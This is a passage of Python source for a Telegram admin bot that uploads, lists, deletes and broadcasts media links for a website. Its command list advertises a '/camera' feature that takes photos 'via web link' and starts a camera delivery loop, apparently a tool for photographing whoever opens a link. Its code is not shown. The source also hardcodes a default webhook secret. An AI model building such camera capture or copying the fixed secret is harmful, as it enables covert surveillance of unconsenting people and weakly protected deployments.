            f"URL: <code>{escape_html(data['url'])}</code>\n"
            f"Thumbnail: {'<code>' + escape_html(data['thumbnail']) + '</code>' if data['thumbnail'] else '<i>None</i>'}\n"
        )
        await update.message.reply_text(
            summary,
            parse_mode="HTML",
            reply_markup=confirm_keyboard(),
        )
        context.user_data["state"] = "upload_confirm"
        return

    if state == "set_secret":
        if not text:
            await update.message.reply_text("Secret cannot be empty. Try again:")
            return
        config.boss_secret = text
        masked = mask_secret(text)
        await update.message.reply_text(
            f"Boss secret saved: <code>{masked}</code>",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
        context.user_data.pop("state", None)
        return

    if state == "broadcast_msg":
        if not text:
            await update.message.reply_text("Message cannot be empty. Try again:")
            return
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("Send", callback_data="broadcast_send"),
                InlineKeyboardButton("Cancel", callback_data="broadcast_cancel"),
            ],
        ])
        context.user_data["broadcast_text"] = text
        await update.message.reply_text(
            f"<b>Confirm Broadcast</b>\n\n{escape_html(text)}",
            parse_mode="HTML",
            reply_markup=keyboard,
        )
        context.user_data.pop("state", None)
        return

    if state == "delete_id":
        if not text:
            await update.message.reply_text("ID cannot be empty. Try again:")
            return
        success = delete_link_api(text)
        if success:
            stats.inc("deletes")
            await update.message.reply_text(
                f"Link <code>{escape_html(text)}</code> deleted.",
                parse_mode="HTML",
                reply_markup=back_button(),
            )
        else:
            await update.message.reply_text(
                "Delete failed. Check the ID and try again.",
                reply_markup=back_button(),
            )
        context.user_data.pop("state", None)
        return

    if state == "seturl_id":
        if not text:
            await update.message.reply_text("ID cannot be empty. Try again:")
            return
        context.user_data["seturl_id"] = text
        context.user_data["state"] = "seturl_url"
        await update.message.reply_text(
            "Send the <b>new download URL</b> for this link:",
            parse_mode="HTML",
        )
        return

    if state == "seturl_url":
        if not text:
            await update.message.reply_text("URL cannot be empty. Try again:")
            return
        if not text.startswith(("http://", "https://")):
            await update.message.reply_text(
                "Invalid URL — must start with http:// or https://\nTry again:"
            )
            return
        link_id = context.user_data.get("seturl_id", "")
        success = update_link_url_api(link_id, text)
        if success:
            stats.inc("uploads")
            await update.message.reply_text(
                f"Link <code>{escape_html(link_id)}</code> URL updated.\n"
                f"New URL: <code>{escape_html(text)}</code>",
                parse_mode="HTML",
                reply_markup=back_button(),
            )
        else:
            await update.message.reply_text(
                "Update failed. Check the ID and try again.",
                reply_markup=back_button(),
            )
        context.user_data.pop("seturl_id", None)
        context.user_data.pop("state", None)
        return

    # No active state — show hint
    await update.message.reply_text(
        "Send /upload to start, or /help for commands."
    )


# ── Upload confirmation callback ───────────────────────────────────
async def upload_confirm_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = context.user_data.get("upload", {})

    if not data or not data.get("url"):
        await query.edit_message_text("Upload data expired. Start again with /upload.")
        return

    await query.edit_message_text("Uploading...")
    is_video = is_video_url(data["url"])
    if is_video:
        success, result = register_movie_api(
            data["title"], data["url"], data.get("thumbnail", "")
        )
    else:
        success, result = upload_link_api(
            data["title"], data["url"], data.get("thumbnail", "")
        )

    if success:
        stats.inc("uploads")
        item_id = result.get("id", "?") if isinstance(result, dict) else result
        if is_video:
            bucket = "video"
            text = (
                "<b>Video Registered</b>\n\n"
                f"Title: <b>{escape_html(data['title'])}</b>\n"
                f"ID: <code>{escape_html(str(item_id))}</code>\n\n"
                f'Watch: <a href="{PUBLIC_BASE_URL}/stream/{bucket}/{item_id}">'
                f"{PUBLIC_BASE_URL}/stream/{bucket}/{item_id}</a>\n\n"
                "<i>Note: if this URL expires, the stream breaks. Use a permanent host for lasting playback.</i>"
            )
        else:
            web_url = f"{PUBLIC_BASE_URL}/dl/file/{item_id}"
            text = (
                "<b>Upload Successful</b>\n\n"
                f"Title: <b>{escape_html(data['title'])}</b>\n"
                f"ID: <code>{escape_html(str(item_id))}</code>\n\n"
                f'Open: <a href="{web_url}">{web_url}</a>'
            )
        await query.edit_message_text(text, parse_mode="HTML", reply_markup=back_button())
    else:
        await query.edit_message_text(
            f"<b>Upload Failed</b>\n\n{escape_html(str(result))}",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
    context.user_data.pop("upload", None)
    context.user_data.pop("state", None)


async def upload_cancel_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer("Upload cancelled.")
    await query.edit_message_text("Upload cancelled.", reply_markup=back_button())
    context.user_data.pop("upload", None)
    context.user_data.pop("state", None)


# ── Broadcast ──────────────────────────────────────────────────────
@admin_only
async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["state"] = "broadcast_msg"
    await update.message.reply_text(
        "<b>Broadcast</b>\n\nSend the message to broadcast to all users:",
        parse_mode="HTML",
    )


@admin_only_cb
async def broadcast_send_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    text = context.user_data.get("broadcast_text", "")
    if not text:
        await query.edit_message_text("Broadcast text expired. Try again with /broadcast.")
        return

    await query.edit_message_text("Broadcasting...")
    status, body = api_request(
        "/api/notify/announce",
        "POST",
        {"title": text, "body": "", "bossSecret": config.boss_secret},
    )
    sent = body.get("sent", 0) if isinstance(body, dict) else 0
    stats.inc("broadcasts")
    await query.edit_message_text(
        f"<b>Broadcast Sent</b>\n\nDelivered to {sent} device(s).",
        parse_mode="HTML",
        reply_markup=back_button(),
    )
    context.user_data.pop("broadcast_text", None)


@admin_only_cb
async def broadcast_cancel_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer("Broadcast cancelled.")
    await query.edit_message_text("Broadcast cancelled.", reply_markup=back_button())
    context.user_data.pop("broadcast_text", None)


# ── Delete ─────────────────────────────────────────────────────────
@admin_only
async def cmd_delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["state"] = "delete_id"
    await update.message.reply_text(
        "<b>Delete Link</b>\n\nSend the link <b>ID</b> to delete:",
        parse_mode="HTML",
    )


# ── /links ─────────────────────────────────────────────────────────
async def cmd_links(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await send_typing(update)
    all_items = fetch_all_media()
    if not all_items:
        await update.message.reply_text(
            "No media uploaded yet.", reply_markup=back_button()
        )
        return
    text = "<b>All Uploaded Media</b>\n\n"
    for i, item in enumerate(all_items[:20], 1):
        title = escape_html(item.get("title", "Untitled"))
        lid = item.get("id", "?")
        kind = item.get("_type", "unknown")
        icon = "🎵" if kind == "song" else "🎬" if kind == "movie" else "🔗"
        url = item.get("url") or item.get("songUrl") or item.get("movieUrl") or ""
        text += f"<b>{i}.</b> {icon} {title}\n"
        text += f"   ID: <code>{lid}</code>\n"
        text += f"   Type: {kind}\n"
        if url:
            text += f'   <a href="{escape_html(url)}">Open</a>\n'
        text += "\n"
    if is_owner(update.effective_user.id):
        text += "Use /delete to remove, /seturl to change URL."
    else:
        text += "Each upload has its own unique link (see /dl and /stream)."
    await update.message.reply_text(
        text, parse_mode="HTML", reply_markup=back_button(), disable_web_page_preview=True
    )


# ── Set URL ────────────────────────────────────────────────────────
@admin_only
async def cmd_seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["state"] = "seturl_id"
    await update.message.reply_text(
        "<b>Change Link URL</b>\n\nSend the link <b>ID</b> whose download URL you want to change:",
        parse_mode="HTML",
    )


# ── Reset (delete all uploads) ─────────────────────────────────────
@admin_only
async def cmd_reset(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("Yes, delete everything", callback_data="reset_confirm_yes"),
            InlineKeyboardButton("Cancel", callback_data="reset_confirm_no"),
        ],
    ])
    await update.message.reply_text(
        "<b>⚠️ Reset Website</b>\n\n"
        "This will <b>permanently delete ALL uploaded media</b>\n"
        "(songs, movies, files) and clear the chat history on your website.",
        parse_mode="HTML",
        reply_markup=keyboard,
    )


@admin_only_cb
async def reset_confirm_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    if data == "reset_confirm_no":
        await query.answer("Reset cancelled.")
        await query.edit_message_text("Reset cancelled.", reply_markup=back_button())
        return

    await query.answer()
    await query.edit_message_text("Deleting all uploads…")
    status, body = api_request("/api/reset", "POST", {"bossSecret": config.boss_secret})
    if status == 200 and isinstance(body, dict) and body.get("success"):
        removed = body.get("removed", 0)
        await query.edit_message_text(
            f"<b>Done.</b> Removed {removed} item(s). All uploads are cleared.",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
    else:
        await query.edit_message_text(
            f"Reset failed: <code>{escape_html(str(body.get('error', status)))}</code>",
            parse_mode="HTML",
            reply_markup=back_button(),
        )


# ── Stats ──────────────────────────────────────────────────────────
@admin_only
async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uptime = time.time() - stats.get("start_time")
    hours = int(uptime // 3600)
    mins = int((uptime % 3600) // 60)
    text = (
        "<b>Bot Statistics</b>\n\n"
        f"Uploads: {stats.get('uploads')}\n"
        f"Deletes: {stats.get('deletes')}\n"
        f"Broadcasts: {stats.get('broadcasts')}\n"
        f"Uptime: {hours}h {mins}m\n"
    )
    await update.message.reply_text(text, parse_mode="HTML", reply_markup=back_button())


# ── Set secret ─────────────────────────────────────────────────────
@admin_only
async def cmd_setsecret(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if args:
        secret = " ".join(args).strip()
        config.boss_secret = secret
        masked = mask_secret(secret)
        await update.message.reply_text(
            f"Boss secret saved: <code>{masked}</code>",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
        return
    context.user_data["state"] = "set_secret"
    await update.message.reply_text(
        "<b>Set Boss Secret</b>\n\nSend the new boss secret:",
        parse_mode="HTML",
    )


# ── Cancel ─────────────────────────────────────────────────────────
@admin_only
async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    for key in ("upload", "broadcast_text", "state"):
        context.user_data.pop(key, None)
    await update.message.reply_text("Operation cancelled.", reply_markup=back_button())


# ── Error handler ──────────────────────────────────────────────────
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Error: {context.error}", exc_info=context.error)
    if update and update.effective_message:
        await update.effective_message.reply_text(
            "An error occurred. Please try again or /cancel."
        )


# ── Set bot commands menu ──────────────────────────────────────────
async def post_init(app: Application):
    await app.bot.set_my_commands([
        BotCommand("start", "Open main menu"),
        BotCommand("camera", "Take photos via web link"),
        BotCommand("myid", "Get your Telegram user ID"),
        BotCommand("setowner", "Lock bot to only your ID"),
        BotCommand("upload", "Upload a new link"),
        BotCommand("links", "View all uploaded media"),
        BotCommand("delete", "Delete a link by ID"),
        BotCommand("seturl", "Change download URL of a link"),
        BotCommand("reset", "Delete ALL uploads from the website"),
        BotCommand("broadcast", "Send notification to all users"),
        BotCommand("stats", "View usage statistics"),
        BotCommand("setsecret", "Update the boss secret"),
        BotCommand("help", "Show help"),
        BotCommand("cancel", "Cancel current operation"),
    ])
    logger.info("Bot commands registered.")
    asyncio.create_task(camera_poller(app))
    logger.info("Camera delivery loop started.")


# ── Main ───────────────────────────────────────────────────────────
def load_token():
    env_path = Path(__file__).parent / ".env"
    token = None

    if env_path.exists():
        with open(env_path, encoding="utf-8") as f:
            for line in f:
                m = re.match(r"^\s*TELEGRAM_BOT_TOKEN\s*=\s*(.*)\s*$", line)
                if m:
                    token = m.group(1).strip().strip('"').strip("'")
                    break

    if not token:
        token = os.environ.get("TELEGRAM_BOT_TOKEN", "")

    return token


def build_app(token):
    return (
        Application.builder()
        .token(token)
        .post_init(post_init)
        .build()
    )


def register_handlers(app):
    # ── Conversation: upload ──
    upload_conv = ConversationHandler(
        entry_points=[CommandHandler("upload", cmd_upload)],
        states={},
        fallbacks=[CommandHandler("cancel", cmd_cancel)],
    )

    # ── Conversation: set secret ──
    secret_conv = ConversationHandler(
        entry_points=[CommandHandler("setsecret", cmd_setsecret)],
        states={},
        fallbacks=[CommandHandler("cancel", cmd_cancel)],
    )

    # Register handlers (order matters — more specific first)
    app.add_handler(upload_conv)
    app.add_handler(secret_conv)

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("camera", cmd_camera))
    app.add_handler(CommandHandler("myid", cmd_myid))
    app.add_handler(CommandHandler("setowner", cmd_setowner))
    app.add_handler(CommandHandler("links", cmd_links))
    app.add_handler(CommandHandler("delete", cmd_delete))
    app.add_handler(CommandHandler("seturl", cmd_seturl))
    app.add_handler(CommandHandler("reset", cmd_reset))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("cancel", cmd_cancel))

    app.add_handler(CallbackQueryHandler(menu_router, pattern="^menu_"))
    app.add_handler(CallbackQueryHandler(upload_confirm_cb, pattern="^upload_confirm$"))
    app.add_handler(CallbackQueryHandler(upload_cancel_cb, pattern="^upload_cancel$"))
    app.add_handler(CallbackQueryHandler(broadcast_send_cb, pattern="^broadcast_send$"))
    app.add_handler(CallbackQueryHandler(broadcast_cancel_cb, pattern="^broadcast_cancel$"))
    app.add_handler(
        CallbackQueryHandler(reset_confirm_cb, pattern="^reset_confirm_(yes|no)$")
    )

    # File-to-Link: capture any forwarded/sent media (documents, video,
    # audio, voice, photos, animations) and publish it to the Updates feed.
    MEDIA_FILTER = (
        filters.Document.ALL
        | filters.VIDEO
        | filters.AUDIO
        | filters.VOICE
        | filters.PHOTO
        | filters.ANIMATION
    )
    app.add_handler(MessageHandler(MEDIA_FILTER, handle_media))

    # Catch-all text messages for conversation flow
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    app.add_error_handler(error_handler)


def main():
    token = load_token()
    if not token:
        print("Error: TELEGRAM_BOT_TOKEN not found.")
        print("Set it in .env or as an environment variable.")
        sys.exit(1)

    render_url = os.environ.get("RENDER_EXTERNAL_URL", "")
    port = int(os.environ.get("PORT", 8443))
    secret_token = os.environ.get("WEBHOOK_SECRET", "azim-webhook-secret")
    # Telegram only allows A-Z, a-z, 0-9, hyphens, underscores
    secret_token = re.sub(r"[^A-Za-z0-9_-]", "-", secret_token)

    app = build_app(token)
    register_handlers(app)

    if render_url:
        # ── Render: webhook mode ──
        webhook_url = render_url.rstrip("/") + "/webhook"
        logger.info(f"Starting in webhook mode: {webhook_url}")
        print(f"Bot running in webhook mode on {render_url}")
        app.run_webhook(
            listen="0.0.0.0",
            port=port,
            url_path="webhook",
            webhook_url=webhook_url,
            secret_token=secret_token,
            drop_pending_updates=True,
        )
    else:
        # ── Local: polling mode ──
        logger.info("Starting in polling mode (local)")
        print("Bot running in polling mode. Press Ctrl+C to stop.")
        app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
